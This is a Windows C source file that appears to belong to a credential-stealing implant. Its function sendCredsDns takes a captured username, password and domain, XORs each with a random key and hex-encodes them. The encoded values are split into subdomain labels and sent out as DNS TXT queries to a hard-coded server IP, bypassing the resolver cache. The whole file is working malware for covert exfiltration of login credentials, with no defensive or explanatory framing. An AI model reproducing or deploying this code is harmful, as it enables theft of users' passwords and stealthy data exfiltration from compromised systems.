#include "pch.h"
#include "dns.h"


BOOL dnsRequest(char* domain) {
	DNS_STATUS status;
	PDNS_RECORD pDnsRecord;
	PIP4_ARRAY pSrvList = NULL;
	LPTSTR pOwnerName = NULL;
	BOOL ret = TRUE;

	pSrvList = (PIP4_ARRAY)LocalAlloc(LPTR, sizeof(IP4_ARRAY));

	if (!pSrvList) {
		ret = FALSE;
		goto localalloc;
	}


	pSrvList->AddrCount = 1;
	inet_pton(AF_INET, IP, (PVOID)pSrvList->AddrArray); //DNS server IP address

	if (pSrvList->AddrArray[0] == INADDR_NONE) {
		goto inaddrnone;
	}

	status = DnsQuery_A(domain,                 //pointer to OwnerName 
		DNS_TYPE_TEXT,                      //Type of the record to be queried
		DNS_QUERY_BYPASS_CACHE,     // Bypasses the resolver cache on the lookup. 
		pSrvList,                   //contains DNS server IP address
		&pDnsRecord,                //Resource record comprising the response
		NULL);                     //reserved for future use

	DnsRecordListFree(pDnsRecord, DnsFreeRecordList);

inaddrnone:
	LocalFree(pSrvList);
localalloc:
	return ret;
}

BOOL craftRequestAndSend(char* value, char* index, char* key, size_t keysize) {
	size_t valueLen = strlen(value);

	if (valueLen > (3 * SIZE_CHUNK)) {
		return FALSE;
	}

	size_t inc = 0;
	size_t bufferLen = valueLen + strlen(TLD) + 10 + keysize;
	size_t currentBufferSize = 0;
	char* buffer = LocalAlloc(LPTR, bufferLen * sizeof(char));
	if (!buffer) {
		return FALSE;
	}

	ZeroMemory(buffer, bufferLen);

	for (size_t i = 0; i < 3; i++) {
		if (valueLen <= SIZE_CHUNK * i) {
			break;
		}
		strncpy_s(buffer + inc, bufferLen - inc, value + SIZE_CHUNK * i, SIZE_CHUNK);
		currentBufferSize = strlen(buffer);
		buffer[currentBufferSize] = '.';
		buffer[currentBufferSize + 1] = '\0';
		inc += SIZE_CHUNK + 1;
	}


	strcat_s(buffer, bufferLen, index);
	strcat_s(buffer, bufferLen, ".");
	strcat_s(buffer, bufferLen, key);
	strcat_s(buffer, bufferLen, ".");
	strcat_s(buffer, bufferLen, TLD);
	dnsRequest(buffer);
	LocalFree(buffer);


	return TRUE;
}

void sendCredsDns(WCHAR* username, WCHAR* password, WCHAR* domain) {


	char* username_A = NULL;
	char* password_A = NULL;
	char* domain_A = NULL;

	if (username && username[0] != '\0') {
		username_A = wcharToChar(username);
	}
	else {
		username_A = _strdup("_");
	}

	if (password && password[0] != '\0') {
		password_A = wcharToChar(password);
	}
	else {
		password_A = _strdup("_");
	}

	if (domain && domain[0] != '\0') {
		domain_A = wcharToChar(domain);
	}
	else {
		domain_A = _strdup("_");
	}


	size_t username_Asize = strlen(username_A);
	size_t password_Asize = strlen(password_A);
	size_t domain_Asize = strlen(domain_A);

	int keysize = 32;
	char* key = generateKey(32);

	if (!username_A || !password_A || !domain_A) {
		return;
	}

	xorWithKey(username_A, username_Asize, key, keysize);
	xorWithKey(password_A, password_Asize, key, keysize);
	xorWithKey(domain_A, domain_Asize, key, keysize);

	char* username_AXor = charToHex(username_A, username_Asize);
	char* password_AXor = charToHex(password_A, password_Asize);
	char* domain_AXor = charToHex(domain_A, domain_Asize);

	LocalFree(username_A);
	LocalFree(password_A);
	LocalFree(domain_A);

	craftRequestAndSend(username_AXor, "0", key, keysize);
	craftRequestAndSend(password_AXor, "1", key, keysize);
	craftRequestAndSend(domain_AXor, "2", key, keysize);

	LocalFree(username_AXor);
	LocalFree(password_AXor);
	LocalFree(domain_AXor);
	LocalFree(key);


	return;
}

